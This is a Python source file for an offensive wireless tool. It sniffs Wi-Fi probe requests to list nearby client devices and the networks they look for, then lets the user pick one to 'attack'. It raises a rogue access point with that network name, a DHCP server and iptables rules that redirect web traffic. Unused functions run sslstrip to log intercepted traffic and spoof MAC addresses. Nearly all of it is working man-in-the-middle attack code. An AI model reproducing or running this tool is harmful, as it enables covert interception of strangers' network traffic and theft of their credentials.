#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import sniff, Ether, sendp, Dot11, IP 
except:
    try:
        from scapy import *
    except:
        sys.exit("Error: You need to install scapy first")
        
from datetime import datetime
import threading
from multiprocessing import Process
import subprocess
from scapy.error import Scapy_Exception
import argparse
import time

INDEX = {}
N = 0


class Sniffing(threading.Thread):
    """Classe which sniff probe requests"""
    def __init__(self, monitor_interface):
        threading.Thread.__init__(self)
        self.monitor_interface = monitor_interface
        
    def run(self):
        
        try:
            def sort(pkt):
                """Print only probe requests"""
                
                global INDEX
                global N

                if (pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4 and 
                        pkt.info != "" and not ((pkt.addr2, pkt.info) in INDEX.keys())):
                    
                    N = N + 1
                    INDEX[(pkt.addr2, pkt.info)] = N
                    signal_strength = -(256-ord(pkt.notdecoded[-4:-3]))
                    print "[" + str(N) + "] " + "%s               %s         \
                    %s" % (pkt.addr2, pkt.info, signal_strength)
                    time.sleep(1)
                    
        except Scapy_Exception("Filter parse error"):
            print("Error: Sort function quitted")
        
        try:
            def stop(pkt):
                """Little trick to stop sniffing properly"""
                
                packet_to_string = str(pkt)
                if packet_to_string.find("1.1.1.1"):
                    return True
                else:
                    return False
                time.sleep(1)
                
        except Scapy_Exception("Filter parse error"):
            print("Error: Stop function quitted")
            
        try:
            sniff(filter="", iface=self.monitor_interface, prn=sort, store=0, stop_filter=stop)
        except (KeyboardInterrupt, SystemExit, NameError):
            print ""

def choice():
    """Choose which # you want to emulatee"""
    
    global INDEX
    client_to_attack = ""
    ssid_to_attack = ""
    number_is_correct = False
    
    if len(INDEX) == 0:
        print "No probe readed, exiting program"
        sys.exit()
    
    else:
        print "\nType a number in the range (1,%s)" % (len(INDEX))
        
        while not number_is_correct:
            number_to_attack = input("Select which # you want to attack (type a number): ")
            
            if number_to_attack in INDEX.values():
                for couple, number in INDEX.items():
                    if number == number_to_attack:
                        client_to_attack, ssid_to_attack = couple
                        number_is_correct = True
                        print "\nYou choosed to attack Client %s with SSID %s\n" % (client_to_attack, ssid_to_attack)
            else:
                print "\nType a number in the range (1,%s)" % (len(INDEX))    

    return ssid_to_attack
     
def macchanger(monitor_interface, internet_interface): #Not used for the moment
    """Change MAC address of both monitor and internet interface"""
    
    cmd = "ifconfig {0} down ; \
            ifconfig {1} down ; \
            sleep 0.2 ; \
            macchanger -r {2} ; \
            macchanger -r {3} ; \
            sleep 0.2 ; \
            ifconfig {4} up ; \
            ifconfig {5} up".format(monitor_interface, internet_interface, 
                    monitor_interface, internet_interface, monitor_interface, internet_interface)
    try:
        retcode = subprocess.call(cmd, stdout=0, shell=True)
        
        if retcode < 0:
            print >> sys.stderr, "Child was terminated by signal", -retcode
        else:
            print "Your MAC adresses have changed."
            
    except OSError as error:
        print >> sys.stderr, "Execution failed:", error


def fire_up_rogue_ap(ssid_to_attack, monitor_interface, internet_interface):
    """Turn on the Rogue AP"""  
    
    cmd_clean_iptables = 'echo "0" > /proc/sys/net/ipv4/ip_forward ; \
            iptables --flush ; \
            iptables -t nat --flush ; \
            iptables --delete-chain ; \
            iptables -t nat --delete-chain'

    try:
        retcode = subprocess.call(cmd_clean_iptables, stdout=0, shell=True)
        if retcode < 0:
            print >> sys.stderr, "Child was terminated by signal", -retcode
 
    except OSError as error:
        print >> sys.stderr, "Execution failed:", error
    
    try:
        proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", 
                "-c", "6", "-e", ssid_to_attack, monitor_interface])
    except OSError as error:
        print >> sys.stderr, "Execution failed:", error
        proc_rogue_ap.kill()
    except KeyboardInterrupt:
        proc_rogue_ap.kill()
    
    file_config_dhcp = open("/etc/udhcpd.conf", 'w')
    file_config_dhcp.write("max_leases 30\nstart 10.1.23.10\nend 10.1.23.100\ninterface at0\ndomain local\noption dns 8.8.8.8\noption subnet 255.255.255.0\noption router 10.1.23.1\nlease 7200\nlease file /tmp/udhcpd.leases")
    file_config_dhcp.close()

    cmd_configuration_ap = 'sleep 2 ; \
    touch /tmp/udhcpd.leases ; \
    ifconfig at0 up ; \
    ifconfig at0 10.1.23.1 netmask 255.255.255.0 ; \
    echo 1 > /proc/sys/net/ipv4/ip_forward ; \
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:10000 ; \
    iptables -t nat -A POSTROUTING -o {0} -j MASQUERADE'.format(internet_interface)
    
    try:
        dhcp_server = subprocess.Popen(["udhcpd", "/etc/udhcpd.conf"])
        retcode = subprocess.call(cmd_configuration_ap, stdout=0, shell=True)
        
        if retcode < 0:
            print >> sys.stderr, "Child was terminated by signal", -retcode
        
    except OSError as error:
        print >> sys.stderr, "Execution failed:", error
    except KeyboardInterrupt:
        dhcp_server.kill()


def exploitation(): #Not used for the moment
    """Tools to analyse traffic"""
    
    try:
        proc_iptables = subprocess.Popen(["sslstrip", "-w", "/root/Desktop/rogue.txt"])
    except OSError as error:
        print >> sys.stderr, "Execution failed:", error
        proc_iptables.kill()
    except KeyboardInterrupt:
        proc_iptables.kill()
        
    try:
        proc_iptables = subprocess.Popen(["wireshark", "-i", "at0", "-k", "&"])
    except OSError as error:
        print >> sys.stderr, "Execution failed:", error
        proc_iptables.kill()
    except KeyboardInterrupt:
        proc_iptables.kill()    
        

def main():
    """Main"""
    
    internet_interface = "eth0"
    monitor_interface = "wlan0mon"
    ssid_to_attack = "FreeWifi"
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--monitor_interface", 
            help="Specify wireless interface in monitor mode (wlan0mon by default).")
    parser.add_argument("-i", "--internet_interface", 
            help="Specify interface on which you have Internet (eth0 by default).")
    parser.add_argument("-s", "--SSID", 
            help="No probe request reader, directly fire up the Rogue AP with the specified SSID.")
    args = parser.parse_args()
    
    if args.monitor_interface:
        monitor_interface = args.monitor_interface.lower() 
    if args.internet_interface:
        internet_interface = args.internet_interface.lower()
   
    if not args.SSID:
   
        print "[%s] Starting scan \n" % datetime.now()
        print " #     Mac Client                   Probe request             Signal Strength"
    
        try:
            while 1:
                thread1 = Sniffing(monitor_interface)
                thread1.start()
                thread1.join(timeout=0.1)
                time.sleep(2)
        except (KeyboardInterrupt, SystemExit):
            print '\n\n! Received keyboard interrupt, quitting sniffing ! \n'
            mon_ping = Ether() / IP(src = "1.1.1.1", dst = "127.0.0.1")
            sendp(mon_ping, verbose=False)
        
        choice_correct = False
        while choice_correct is False:
            try:
                ssid_to_attack = choice()
                choice_correct = True
            except (KeyboardInterrupt, SystemExit):
                print "\n\n! Received keyboard interrupt, quitting choice ! \n"
                sys.exit()
            except (SyntaxError, NameError):
                print ""
        
        try:
            proc = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, 
                    monitor_interface, internet_interface))
            proc.start()
            proc.join()
            time.sleep(86400)    
        except (KeyboardInterrupt, SystemExit):
            print '\n\n! Received keyboard interrupt, quitting rogue AP ! \n'
            proc.terminate()
        
    
    else:
        ssid_to_attack = args.SSID
        try:
            proc = Process(target=fire_up_rogue_ap, args=(ssid_to_attack, 
                    monitor_interface, internet_interface))
            proc.start()
            proc.join()
            time.sleep(86400)
        except (KeyboardInterrupt, SystemExit):
            print '\n\n! Received keyboard interrupt, quitting rogue AP ! \n'
            proc.terminate()
   
   
if __name__ == "__main__":
    main()              